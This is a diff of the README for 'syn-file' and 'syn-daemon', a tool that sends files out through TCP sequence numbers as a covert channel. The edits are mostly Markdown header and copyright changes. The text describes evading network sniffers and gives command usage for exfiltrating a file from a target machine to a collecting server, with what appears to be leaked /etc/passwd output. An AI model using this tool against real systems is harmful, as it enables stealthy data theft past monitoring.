@@ -16,7 +16,7 @@ that is listening on the wire running **syn-daemon**.
 
 
 
-##Background
+## Background
 
 There are some tools to deploy covert channels, mainly using ICMP protocol, padding the content in the payload section...
 but that looks quite suspicious and is very easy to spot using a network sniffer, as Wireshark.
@@ -24,10 +24,10 @@ but that looks quite suspicious and is very easy to spot using a network sniffer
 However I have not seen any tool to deploy covert channels using TCP sequence numbers, also in **syn-file** the payload is left empty ;-)
 
 
-##usage / example
+## usage / example
 
 
-###syn-daemon (server)
+### syn-daemon (server)
 ```
 # ./syn-daemon -i iface -s source_ip -f file_for_exfiltrated_data
 -i interface
@@ -71,7 +71,7 @@ gdm:x:478:477:Gnome Display Manager daemon:/var/lib/gdm:/bin/false
 
 
 
-###syn-file (client / target machine)
+### syn-file (client / target machine)
 ```
 # ./syn-file -i interface -d dst_ip -f file_to_exfiltrate -p dst_port -P src_port -m MAC_address_server
 -i interface
@@ -99,11 +99,9 @@ using interface: eth0
 ...
 ```
 
-##Disclaimer
+## Disclaimer
 Only use allowed for educational purposes or professionaly during a penetration test given the proper permission.
 
 All rights reserved
 
-(c) 2017 spinfoo
-
-Jacobo Avariento
+(c) 2017 defensahacker
